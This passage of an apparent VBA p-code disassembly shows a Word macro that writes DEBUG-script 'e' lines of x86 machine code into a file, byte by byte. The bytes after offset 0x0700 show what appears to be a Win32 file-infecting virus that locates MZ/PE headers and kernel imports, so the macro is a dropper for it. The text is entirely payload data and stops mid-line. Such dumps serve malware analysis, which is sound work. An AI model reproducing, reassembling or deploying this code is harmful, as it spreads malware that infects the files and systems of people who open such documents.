' 	LitStr 0x0037 "e 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #87:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #88:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #89:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #90:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #91:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #92:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #93:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #94:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #95:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #96:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #97:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #98:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #99:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #100:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #101:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #102:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0700 55 e8 00 00 00 00 5d 8b dd 81 ed 06 10 40 00 b8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #103:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0710 00 10 00 00 83 c0 06 2b d8 89 9d d4 18 40 00 ba "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #104:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0720 8d 1b 40 00 03 d5 8b 8d 89 1b 40 00 55 e8 14 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #105:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0730 00 00 5d 83 f8 ff 74 5c 89 85 9e 1b 40 00 55 bb "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #106:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0740 7c 1b 40 00 03 dd 53 ff d0 5d 89 85 d0 18 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #107:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0750 bf 89 1b 40 00 03 fd 8b 0f 81 f9 41 59 41 4d 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #108:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0760 15 83 c7 04 8b d7 03 f9 57 e8 35 00 00 00 5f 89 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #109:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0770 07 83 c7 04 eb e1 c7 85 38 1b 40 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #110:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0780 e8 f1 05 00 00 e8 8f 05 00 00 e8 96 04 00 00 e8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #111:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0790 6f 06 00 00 8b 85 6c 1b 40 00 03 85 d4 18 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #112:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07a0 5d 50 c3 8b b5 d0 18 40 00 66 81 3e 4d 5a 0f 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #113:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07b0 8c 00 00 00 33 c0 66 8b 46 3c 03 85 d0 18 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #114:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07c0 96 66 81 3e 50 45 75 78 8b 76 78 03 b5 d0 18 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #115:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07d0 00 8b 46 1c 03 85 d0 18 40 00 89 85 3c 1b 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #116:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07e0 8b 46 20 03 85 d0 18 40 00 89 85 40 1b 40 00 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #117:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07f0 46 24 03 85 d0 18 40 00 89 85 44 1b 40 00 33 c0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #118:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0800 51 8b f2 8b bd 40 1b 40 00 03 f8 8b 3f 03 bd d0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #119:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0810 18 40 00 f3 a6 83 f9 00 74 06 83 c0 04 59 eb e0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #120:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0820 59 d1 e8 03 85 44 1b 40 00 33 db 66 8b 18 c1 e3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #121:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0830 02 03 9d 3c 1b 40 00 8b 03 03 85 d0 18 40 00 c3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #122:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0840 b8 ff ff ff ff c3 8b b5 d4 18 40 00 66 81 3e 4d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #123:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0850 5a 0f 85 96 00 00 00 33 c0 66 8b 46 3c 8b f0 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #124:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0860 b5 d4 18 40 00 66 81 3e 50 45 0f 85 7d 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #125:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0870 8b b6 80 00 00 00 03 b5 d4 18 40 00 8b c6 8b f0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #126:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0880 8b 76 0c 03 b5 d4 18 40 00 81 3e 4b 45 52 4e 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #127:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0890 05 83 c0 14 eb e8 8b f0 8b 46 10 03 85 d4 18 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #128:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08a0 00 89 85 48 1b 40 00 83 3e 00 74 41 8b 36 03 b5 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #129:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08b0 d4 18 40 00 8b de 33 c0 83 3b 00 74 30 80 7b 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #130:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08c0 80 74 16 8b 33 03 b5 d4 18 40 00 83 c6 02 8b fa "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #131:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08d0 51 f3 a6 83 f9 00 59 74 06 40 83 c3 04 eb d9 c1 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #132:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08e0 e0 02 03 85 48 1b 40 00 8b d8 8b 00 c3 b8 ff ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #133:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08f0 ff ff c3 c7 85 34 1b 40 00 00 00 00 00 e8 ae 02 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #134:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0900 00 00 89 85 30 1b 40 00 52 b8 80 00 00 00 e8 ab "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #135:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0910 02 00 00 5a 52 e8 07 02 00 00 83 f8 ff 0f 84 f1 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #136:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0920 01 00 00 89 85 54 1b 40 00 e8 6e 02 00 00 83 f8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #137:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0930 ff 0f 84 d2 01 00 00 83 bd 4c 1b 40 00 00 0f 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #138:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0940 c5 01 00 00 91 89 8d 50 1b 40 00 8b 85 54 1b 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #139:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0950 00 8b 8d 50 1b 40 00 81 c1 11 20 00 00 e8 e9 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #140:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
